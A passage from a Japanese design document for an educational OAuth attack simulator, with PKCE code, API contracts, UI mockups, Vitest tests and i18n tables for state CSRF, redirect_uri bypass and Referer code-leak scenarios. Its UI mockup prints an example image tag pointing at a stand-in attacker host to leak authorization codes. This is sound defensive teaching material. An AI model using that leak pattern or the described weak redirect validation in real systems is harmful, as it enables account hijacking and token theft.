const codeChallenge = base64urlEncode(
  await crypto.subtle.digest("SHA-256", new TextEncoder().encode(codeVerifier))
);
// code_verifier はブラウザのメモリ (Signal) に保持。外部送信しない

// 2. 認可リクエスト: code_challenge を付与
GET /api/oauth/authorize?
  client_id=demo-app&
  redirect_uri=...&
  code_challenge=CODE_CHALLENGE_HERE&
  code_challenge_method=S256

// 3. トークン交換: code_verifier を送信
POST /api/oauth/token
{
  "grant_type": "authorization_code",
  "code": "CODE",
  "code_verifier": "CODE_VERIFIER_HERE"   // ← 攻撃者はこれを知らない
}

// 4. サーバー側検証: SHA-256(code_verifier) === code_challenge
// 攻撃者は code_verifier を知らないため、盗んだコードを使用できない
```

**codeHints:**
- `code_verifier` は最低 43 文字、最大 128 文字の暗号学的ランダム文字列を使用すること (RFC 7636 §4.1)
- `code_challenge_method` は `S256` を使用すること。`plain` は推奨しない
- `code_verifier` はセッションストレージまたはメモリ Signal に保持し、`localStorage` や URL には含めないこと
- フロントエンド SPA での OAuth は必ず PKCE を使用すること。`client_secret` はフロントエンドに埋め込まない
- 追加の緩和策: `Referrer-Policy: no-referrer` ヘッダをコールバックページに設定する

#### API 契約

```
POST /api/oauth/attack/code-via-referer
Content-Type: application/json

Request: {} (E-2: 両モードを並列実行するため body は空オブジェクト。
  傍受コード・client 認証情報・PKCE 設定は全てサーバー側のシード値から生成される。
  zod スキーマ: oauthAttackCodeViaRefererSchema = z.object({}))

Response: { data: AttackResult, _trace: ServerTrace }
  // data.outcome: "succeeded" (常に)
  // data.steps: 5 ステップ完全形
  // data.blockedBy: "pkce_code_verifier_missing" (堅牢側で発火)
  // data.extra: { stolenCode, simulatedReferer, codeChallenge?, ... }
```

**補助エンドポイント:** 廃止 (E-2 契約で統合済み)。攻撃シミュレーションに必要なシード値生成・Referer ヘッダの偽装・code_challenge 付与は全てメインのハンドラ内で完結する (1 リクエストで両モード並列実行 — Phase 2 第三コミット e336b6c で実装)。

#### _trace 設計

```typescript
// アクセスログシミュレーション (外部リクエストは送信しない)
trace.addSessionOp({
  op: "simulate_referer_leak",
  sessionId: "n/a",
  detail: `Simulated server access log: GET /pixel.png Referer: ${callbackUrl}`,
});

// PKCE 検証
trace.addCryptoOp({
  op: pkceEnabled ? "pkce_verify(S256)" : "pkce_check_skipped",
  input: pkceEnabled ? `code_verifier=MISSING, stored_challenge=${codeChallenge}` : "(PKCE not configured)",
  output: pkceEnabled ? "REJECTED — code_verifier required" : "ACCEPTED (脆弱: PKCE なし)",
  algo: "SHA-256",
  detail: pkceEnabled
    ? "RFC 7636: code_verifier が提供されなかったため、トークン交換を拒否しました"
    : "PKCE が設定されていないため、盗んだコードのみでトークン交換が成立しました",
});
```

#### UI 設計

```
┌─ Attacker View ───────────────────────────────────────────────┐
│  ⚠ 教育用シミュレーション — 実環境を攻撃するためのコードではありません        │
├───────────────────────────────────────────────────────────────┤
│  フロー:                                                       │
│  1. 被害者がコールバック URL を受信 (?code=XXXX が URL に残る) │
│  2. ページが外部リソースを読み込む                              │
│     <img src="https://attacker.example/pixel.png">            │
│     → ブラウザが Referer に ?code=XXXX を含む URL を送信      │
│  3. 攻撃者がログからコードを抽出                                │
│     ※ 実際の外部リクエストは送信しません (シミュレーション)     │
│                                                               │
│  [○ PKCE なし (脆弱)]  [● PKCE あり (防御)]                  │ ← Toggle
│                                                               │
│  シミュレートされた Referer ヘッダ:                             │
│  http://localhost:3000/auth/oauth/callback?code=XXXX          │
│                                                               │
│  ▶ [傍受コードでトークン交換を試みる]                           │
│                                                               │
│  結果: 「この実装は脆弱です: PKCE なしの認可コードは...」        │
│     または 「防御が機能しました: PKCE の code_verifier が...」  │
└───────────────────────────────────────────────────────────────┘
```

#### i18n キー

| キー | 日本語 | English |
|------|--------|---------|
| `oauth.attack.code_referer.name` | `認可コード傍受 (Referer 漏洩)` | `Authorization Code Interception (Referer Leak)` |
| `oauth.attack.code_referer.step1` | `認可コードがコールバック URL のクエリパラメータに含まれる` | `Authorization code included in callback URL query string` |
| `oauth.attack.code_referer.step2` | `外部リソースの読み込みが認可コードを含む Referer を送信` | `External resource triggers Referer header with code` |
| `oauth.attack.code_referer.step3` | `攻撃者がサーバーアクセスログからコードを抽出` | `Attacker extracts code from server access log` |
| `oauth.attack.code_referer.step4_exploit` | `盗んだコードをアクセストークンに交換` | `Stolen code exchanged for access token` |
| `oauth.attack.code_referer.step4_blocked` | `PKCE の code_verifier 検証が盗まれたコードを拒否` | `PKCE code_verifier check rejects stolen code` |
| `oauth.attack.code_referer.result_vuln` | `この実装は脆弱です: PKCE なしの認可コードは傍受後にトークン交換に悪用される可能性があります` | `This implementation is vulnerable: authorization code without PKCE can be exchanged after interception` |
| `oauth.attack.code_referer.result_defended` | `防御が機能しました: PKCE の code_verifier が欠如しているため、盗んだコードは使用できません` | `Defense worked: stolen code is unusable without the PKCE code_verifier` |
| `oauth.attack.code_referer.toggle_vuln` | `PKCE なし (脆弱)` | `Without PKCE (vulnerable)` |
| `oauth.attack.code_referer.toggle_defended` | `PKCE あり (防御)` | `With PKCE (defended)` |
| `oauth.attack.code_referer.sim_note` | `実際の外部リクエストは送信しません (シミュレーション)` | `No actual external requests are sent (simulation only)` |

---

## 5. UI コンポーネント設計

### 5.1 ディレクトリ構成

```
src/components/auth/attacks/oauth/
├── OAuthAttackPanel.tsx         # 攻撃タブのルートコンポーネント (シナリオセレクタ + ViewModeToggle)
├── StateCsrfDemo.tsx           # シナリオ A: state CSRF (2パス切替 UI)
├── RedirectUriBypassDemo.tsx   # シナリオ B: redirect_uri バイパス (3モードラジオ)
├── CodeRefererDemo.tsx         # シナリオ C: Referer 漏洩 (PKCE あり/なし切替)
└── OAuthAttackPanel.css         # 共通スタイル
```

### 5.2 OAuthAttackPanel.tsx 設計

```typescript
// src/components/auth/attacks/oauth/OAuthAttackPanel.tsx
import { createSignal, Show } from "solid-js";
import { useI18n } from "../../../../i18n/context";
import EducationalWarningBanner from "../../../shared/EducationalWarningBanner";
import ViewModeToggle from "../../../shared/ViewModeToggle";
import StateCsrfDemo from "./StateCsrfDemo";
import RedirectUriBypassDemo from "./RedirectUriBypassDemo";
import CodeRefererDemo from "./CodeRefererDemo";

type OAuthAttackScenario = "state-csrf" | "redirect-uri-bypass" | "code-via-referer";

export default function OAuthAttackPanel() {
  const { t } = useI18n();
  const [scenario, setScenario] = createSignal<OAuthAttackScenario>("state-csrf");

  return (
    <div class="oauth-attack-view">
      <EducationalWarningBanner />
      <div class="scenario-selector" role="tablist" aria-label={t("攻撃シナリオ選択", "Select attack scenario")}>
        {/* ラジオボタン形式のシナリオセレクタ */}
      </div>
      <Show when={scenario() === "state-csrf"}>
        <StateCsrfDemo />
      </Show>
      <Show when={scenario() === "redirect-uri-bypass"}>
        <RedirectUriBypassDemo />
      </Show>
      <Show when={scenario() === "code-via-referer"}>
        <CodeRefererDemo />
      </Show>
    </div>
  );
}
```

### 5.3 StateCsrfDemo.tsx 設計方針

- `createSignal<boolean>(false)` で `useState` を管理
- 攻撃実行ボタンを押すと `apiPost<AttackResult>("/api/oauth/attack/state-csrf", { useState, attackerCode }, "attack-oauth")` を呼ぶ
- `AttackStepTimeline` コンポーネントに `steps` を渡して時系列表示
- 攻撃完了後に `AttackDefensePanel` が自動展開 (`createEffect` で `result()` を監視)
- Props はデストラクチャリングせず `props.xxx` でアクセスすること (SolidJS ルール)

### 5.4 RedirectUriBypassDemo.tsx 設計方針

- `createSignal<"exact" | "prefix" | "regex_bad">("exact")` で `validationMode` を管理
- 各モードの検証ロジック説明をインラインコードブロックで表示 (教材効果)
- `validationMode()` が変わると即座に「この検証では `攻撃者 URI` は通過しますか？」のプレビューを更新する (`createMemo` で算出)
- 実行ボタン押下時のみサーバー API を呼ぶ

### 5.5 CodeRefererDemo.tsx 設計方針

- `createSignal<boolean>(false)` で `pkceEnabled` を管理
- 「シミュレートされた Referer ヘッダ」ボックスに `code` を含む URL を表示 (視覚的インパクト)
- PKCE あり/なし切替で `code_challenge` 生成の有無を表示
- `setupCode()` → `attemptExchange()` の2段階フローでデモを進行

---

## 6. テスト要件

### 6.1 バックエンド単体テスト (Vitest)

E-2 契約に準拠したテスト構成。各シナリオは 1 リクエストで両モード並列実行のため、`outcome === "succeeded"` 固定 + 5 ステップ完全形 + `blockedBy` で防御識別子を検証する。実装は `server/__tests__/oauth-attack.test.ts` (Phase 2 第三コミット e336b6c)。

```typescript
// server/__tests__/oauth-attack.test.ts (実装抜粋)

// it.each で 3 シナリオ共通の不変条件を一括検証
it.each([
  { id: "oauth-state-csrf", route: "/api/oauth/attack/state-csrf", expectedBlockedBy: "oauth_state_mismatch" },
  { id: "oauth-redirect-uri-bypass", route: "/api/oauth/attack/redirect-uri-bypass", expectedBlockedBy: "oauth_redirect_uri_exact_match" },
  { id: "oauth-code-via-referer", route: "/api/oauth/attack/code-via-referer", expectedBlockedBy: "pkce_code_verifier_missing" },
])("$id: E-2 不変条件 (両モード並列実行)", async ({ id, route, expectedBlockedBy }) => {
  const res = await app.request(route, {
    method: "POST",
    body: JSON.stringify({}),
    headers: { "Content-Type": "application/json" },
  });
  expect(res.status).toBe(200);  // E-2: HTTP ステータス常に 200
  const body = await res.json();
  expect(body.data.scenarioId).toBe(id);
  expect(body.data.outcome).toBe("succeeded");  // E-2: outcome 常に "succeeded"
  expect(body.data.steps).toHaveLength(5);  // E-2: 5 ステップ完全形 (probe → tamper → forge → exploit → verify)
  expect(body.data.blockedBy).toBe(expectedBlockedBy);  // 堅牢側で発火した防御識別子
  expect(body.data.logId).toBeGreaterThan(0);  // attack_log への記録
  expect(body._trace.isAttackMode).toBe(true);
  expect(body._trace.attackSteps).toHaveLength(5);
});

// シナリオ A: state-csrf — extra フィールド (attackerCodeId / victimState / codeState) 検証
test("state-csrf: extra に attackerCodeId / victimState / codeState を含む", async () => {
  const res = await app.request("/api/oauth/attack/state-csrf", {
    method: "POST", body: JSON.stringify({}),
    headers: { "Content-Type": "application/json" },
  });
  const body = await res.json();
  expect(body.data.extra).toBeDefined();
  expect(body.data.extra.attackerCodeId).toMatch(/^ATTACKER_CODE_/);
  expect(body.data.extra.victimState).toBeTypeOf("string");
  expect(body.data.steps[3].status).toBe("success");  // 脆弱側 exploit (state 検証なし → 認可コード受理)
  expect(body.data.steps[4].status).toBe("blocked");  // 堅牢側 verify (state 不一致で拒否)
});

// シナリオ B: redirect-uri-bypass — extra に exact / prefix / regex_bad の 3 検証結果
test("redirect-uri-bypass: extra に 3 検証モードの結果を含む", async () => {
  const res = await app.request("/api/oauth/attack/redirect-uri-bypass", {
    method: "POST", body: JSON.stringify({}),
    headers: { "Content-Type": "application/json" },
  });
  const body = await res.json();
  expect(body.data.extra).toBeDefined();
  expect(body.data.extra.exactValidationResult).toBe("rejected");  // 堅牢側
  expect(body.data.extra.prefixValidationResult).toBe("accepted");  // 脆弱側 1
  expect(body.data.extra.regexBadValidationResult).toBe("accepted");  // 脆弱側 2
});

// シナリオ C: code-via-referer — extra に stolenCode / simulatedReferer / codeChallenge
test("code-via-referer: extra に stolenCode / simulatedReferer / codeChallenge を含む", async () => {
  const res = await app.request("/api/oauth/attack/code-via-referer", {
    method: "POST", body: JSON.stringify({}),
    headers: { "Content-Type": "application/json" },
  });
  const body = await res.json();
  expect(body.data.extra).toBeDefined();
  expect(body.data.extra.stolenCode).toMatch(/^[A-Z0-9]+$/);
  expect(body.data.extra.simulatedReferer).toContain("code=");
  expect(body.data.extra.codeChallenge).toBeTypeOf("string");
});

// 本番ガード (NODE_ENV=production で 403)
test("attack ルートは NODE_ENV=production で 403 を返す", async () => {
  const prevEnv = process.env.NODE_ENV;
  process.env.NODE_ENV = "production";
  try {
    const res = await app.request("/api/oauth/attack/state-csrf", {
      method: "POST", body: JSON.stringify({}),
      headers: { "Content-Type": "application/json" },
    });
    expect(res.status).toBe(403);
  } finally {
    process.env.NODE_ENV = prevEnv;
  }
});
```

### 6.2 フロントエンド統合確認事項

| 確認項目 | 方法 |
|---------|------|
| `EducationalWarningBanner` が Attacker View 最上部に常時表示される | 目視 + `sticky` CSS 確認 |
| バナーが閉じられない (close ボタンなし) | DOM 確認 |
| 攻撃成立時のメッセージが「この実装は」または「このシナリオでは」で始まる | テキスト確認 |
| `AttackDefensePanel` が攻撃完了後に自動展開される | Signal 変化確認 |
| `DataFlowPanel` の Trace タブに `isAttackMode: true` による赤ハイライトが表示される | 目視確認 |
| `console.log` に攻撃ペイロードが出力されない | ブラウザコンソール確認 |
| `POST /api/reset` 後に全シナリオが正常に動作する | 手動テスト |

---

## 7. i18n キー一覧表

| キー | 日本語 | English |
|------|--------|---------|
| `oauth.attack.title` | `OAuth 2.0 攻撃シナリオ` | `OAuth 2.0 Attack Scenarios` |
| `oauth.attack.scenario.state_csrf` | `A. state 欠落 CSRF` | `A. State Parameter CSRF` |
| `oauth.attack.scenario.redirect_bypass` | `B. redirect_uri 検証バイパス` | `B. redirect_uri Validation Bypass` |
| `oauth.attack.scenario.code_referer` | `C. 認可コード傍受 (Referer 漏洩)` | `C. Authorization Code Interception (Referer Leak)` |
| `oauth.attack.state_csrf.name` | `state 欠落 CSRF` | `State Parameter CSRF` |
| `oauth.attack.state_csrf.description` | `これは CWE-352 / CAPEC-62 の概念実証です。state パラメータが欠如している場合に CSRF が成立する状況をシミュレーションします。` | `This is a proof-of-concept for CWE-352 / CAPEC-62. Simulates how CSRF can succeed when the state parameter is absent.` |
| `oauth.attack.state_csrf.step1` | `被害者が state なしでログインを開始` | `Victim initiates login without state` |
| `oauth.attack.state_csrf.step2` | `攻撃者が認可 URL の構造を観察` | `Attacker observes authorization URL structure` |
| `oauth.attack.state_csrf.step3` | `攻撃者のコードで悪意あるコールバック URL を偽造` | `Craft malicious callback URL with attacker's code` |
| `oauth.attack.state_csrf.step4_exploit` | `被害者のセッションが攻撃者アカウントに紐付く` | `Victim's session links to attacker account` |
| `oauth.attack.state_csrf.step4_blocked` | `state 不一致を検出 — CSRF を阻止` | `State mismatch detected — CSRF blocked` |
| `oauth.attack.state_csrf.result_vuln` | `この実装は脆弱です: state 検証が省略されているため、CSRF が成立しました` | `This implementation is vulnerable: CSRF succeeded because state validation was omitted` |
| `oauth.attack.state_csrf.result_defended` | `防御が機能しました: state パラメータの不一致が検出され、コールバックが拒否されました` | `Defense worked: state parameter mismatch detected — callback rejected` |
| `oauth.attack.state_csrf.defense_title` | `防御: state パラメータの検証` | `Defense: State Parameter Validation` |
| `oauth.attack.state_csrf.defense_body` | `RFC 6749 §10.12 は CSRF 対策として state パラメータの使用を推奨しています。暗号学的乱数で生成した state を認可リクエストに含め、コールバックで照合してください。` | `RFC 6749 §10.12 recommends using the state parameter as a CSRF token. Generate a cryptographically random value, include it in the authorization request, and verify it on callback.` |
| `oauth.attack.state_csrf.toggle_vuln` | `state なし (脆弱)` | `Without state (vulnerable)` |
| `oauth.attack.state_csrf.toggle_defended` | `state あり (防御)` | `With state (defended)` |
| `oauth.attack.redirect_bypass.name` | `redirect_uri 検証バイパス` | `redirect_uri Validation Bypass` |
| `oauth.attack.redirect_bypass.description` | `これは CWE-601 / CAPEC-194 の概念実証です。前方一致または誤正規表現による redirect_uri 検証が攻撃者に悪用される状況をシミュレーションします。` | `This is a proof-of-concept for CWE-601 / CAPEC-194. Simulates how prefix or bad-regex redirect_uri validation can be bypassed.` |
| `oauth.attack.redirect_bypass.mode_exact` | `完全一致 (安全)` | `Exact match (safe)` |
| `oauth.attack.redirect_bypass.mode_prefix` | `前方一致 (脆弱)` | `Prefix match (vulnerable)` |
| `oauth.attack.redirect_bypass.mode_regex` | `誤正規表現 (脆弱)` | `Bad regex (vulnerable)` |
| `oauth.attack.redirect_bypass.step1` | `登録済み redirect_uri のフォーマットを観察` | `Observe registered redirect_uri format` |
| `oauth.attack.redirect_bypass.step2` | `攻撃者が制御する redirect_uri を偽造` | `Craft attacker-controlled redirect_uri` |
| `oauth.attack.redirect_bypass.step3_exploit` | `攻撃者のサーバーに認可コードが送信される` | `Authorization code sent to attacker's server` |
| `oauth.attack.redirect_bypass.step4_blocked` | `完全一致検証が攻撃者 URI を拒否` | `Exact-match validation rejects attacker URI` |
| `oauth.attack.redirect_bypass.result_vuln` | `この実装は脆弱です: {mode} 検証により攻撃者の redirect_uri が受理されました` | `This implementation is vulnerable: {mode} validation accepted the attacker's redirect_uri` |
| `oauth.attack.redirect_bypass.result_defended` | `防御が機能しました: 完全一致検証が未登録の redirect_uri を拒否しました` | `Defense worked: exact-match validation rejected unregistered redirect_uri` |
| `oauth.attack.redirect_bypass.defense_title` | `防御: redirect_uri の完全一致検証` | `Defense: Exact-Match redirect_uri Validation` |
| `oauth.attack.redirect_bypass.defense_body` | `RFC 6749 §3.1.2 は redirect_uri を登録済み URI と完全一致で検証することを要求しています。既存の oauth-sim.ts の registeredUris.includes(redirectUri) が安全な実装例です。` | `RFC 6749 §3.1.2 requires validating redirect_uri against registered URIs using exact string matching. The existing oauth-sim.ts uses registeredUris.includes(redirectUri) as a safe implementation.` |
| `oauth.attack.code_referer.name` | `認可コード傍受 (Referer 漏洩)` | `Authorization Code Interception (Referer Leak)` |
| `oauth.attack.code_referer.description` | `これは CWE-200 / CWE-598 / CAPEC-94 の概念実証です。コールバック URL のクエリパラメータに含まれる認可コードが Referer ヘッダ経由で漏洩する状況をシミュレーションします。` | `This is a proof-of-concept for CWE-200 / CWE-598 / CAPEC-94. Simulates how an authorization code in callback URL query parameters can leak via the Referer header.` |
| `oauth.attack.code_referer.step1` | `認可コードがコールバック URL のクエリパラメータに含まれる` | `Authorization code included in callback URL query string` |
| `oauth.attack.code_referer.step2` | `外部リソースの読み込みが認可コードを含む Referer を送信` | `External resource triggers Referer header with code` |
| `oauth.attack.code_referer.step3` | `攻撃者がサーバーアクセスログからコードを抽出` | `Attacker extracts code from server access log` |
| `oauth.attack.code_referer.step4_exploit` | `盗んだコードをアクセストークンに交換` | `Stolen code exchanged for access token` |
| `oauth.attack.code_referer.step4_blocked` | `PKCE の code_verifier 検証が盗まれたコードを拒否` | `PKCE code_verifier check rejects stolen code` |
| `oauth.attack.code_referer.result_vuln` | `この実装は脆弱です: PKCE なしの認可コードは傍受後にトークン交換に悪用される可能性があります` | `This implementation is vulnerable: authorization code without PKCE can be exchanged after interception` |
| `oauth.attack.code_referer.result_defended` | `防御が機能しました: PKCE の code_verifier が欠如しているため、盗んだコードは使用できません` | `Defense worked: stolen code is unusable without the PKCE code_verifier` |
| `oauth.attack.code_referer.toggle_vuln` | `PKCE なし (脆弱)` | `Without PKCE (vulnerable)` |
| `oauth.attack.code_referer.toggle_defended` | `PKCE あり (防御)` | `With PKCE (defended)` |
| `oauth.attack.code_referer.sim_note` | `実際の外部リクエストは送信しません (シミュレーション)` | `No actual external requests are sent (simulation only)` |
| `oauth.attack.code_referer.defense_title` | `防御: PKCE (RFC 7636) の導入` | `Defense: Implement PKCE (RFC 7636)` |
| `oauth.attack.code_referer.defense_body` | `PKCE は認可コード傍受攻撃を防ぐために設計されています。code_verifier (秘密値) と code_challenge (SHA-256 ハッシュ) を使い、コードを盗んだだけではトークン交換ができないようにします。フロントエンド SPA では必ず PKCE を使用してください。` | `PKCE is designed to prevent authorization code interception attacks. Using a code_verifier and its SHA-256 hash (code_challenge), stolen codes cannot be exchanged for tokens. Always use PKCE in frontend SPAs.` |

---

## 8. 関連ファイル

### 既存ファイル (参照・修正対象)

| ファイルパス | 役割 | 変更種別 |
|------------|------|---------|
| `server/routes/oauth-sim.ts` | 既存 OAuth 認可サーバーシミュレーション (redirect_uri 完全一致検証、コードの used フラグ管理) | 参照のみ (変更なし) |
| `src/components/auth/OAuthFlow.tsx` | 既存 OAuth フロー Defender View UI | `ViewModeToggle` 追加のみ |
| `server/db/schema.ts` | `oauth_clients` テーブル (client_id: `"demo-app"`, redirect_uris, client_secret) | 参照のみ |
| `shared/api-types.ts` | `AttackStep`, `AttackResult`, `ServerTrace`, `OAuthClientRow`, `OAuthCodeRow` | `AttackStep[]` が追加される想定 (DESIGN/03) |
| `server/middleware/trace-logger.ts` | `addAttackStep()` メソッド | 参照 (DESIGN/03 で拡張済み想定) |

### 新規作成ファイル

| ファイルパス | 役割 |
|------------|------|
| `server/routes/attack-oauth.ts` | 攻撃シミュレーションルート (`POST /api/oauth/attack/state-csrf`, `POST /api/oauth/attack/redirect-uri-bypass`, `POST /api/oauth/attack/code-via-referer`, `POST /api/oauth/attack/code-via-referer/setup`) |
| `src/components/auth/attacks/oauth/OAuthAttackPanel.tsx` | Attacker View ルートコンポーネント |
| `src/components/auth/attacks/oauth/StateCsrfDemo.tsx` | シナリオ A UI |
| `src/components/auth/attacks/oauth/RedirectUriBypassDemo.tsx` | シナリオ B UI |
| `src/components/auth/attacks/oauth/CodeRefererDemo.tsx` | シナリオ C UI |
| `src/components/auth/attacks/oauth/OAuthAttackPanel.css` | 攻撃デモ共通スタイル |
| `server/routes/attack-oauth.test.ts` | Vitest テスト (§6.1 参照) |

### 設計書内参照

| ファイルパス | 参照理由 |
|------------|---------|
| [DESIGN/00-overview.md](./00-overview.md) | OAuth 攻撃シナリオの全体マトリクス位置 (`oauth` タブ、行 3) |
| [DESIGN/03-data-model.md](./03-data-model.md) | `AttackStep`, `AttackResult`, `AttackStepPayload` 型定義 |
| [DESIGN/04-safety-guardrails.md](./04-safety-guardrails.md) | `EducationalWarningBanner`, 文言ルール, PR チェックリスト |

### 参考 RFC / 仕様

| 仕様 | 関連シナリオ |
|------|------------|
| RFC 6749 §10.12 (CSRF) | シナリオ A |
| RFC 6749 §3.1.2 (redirect_uri) | シナリオ B |
| RFC 6819 §5.2.3.5 (redirect_uri 登録) | シナリオ B |
| RFC 7636 (PKCE) | シナリオ C |
| CWE-352 (CSRF) | シナリオ A |
| CWE-601 (Open Redirect) | シナリオ B |
| CWE-200 / CWE-598 (Information Exposure) | シナリオ C |
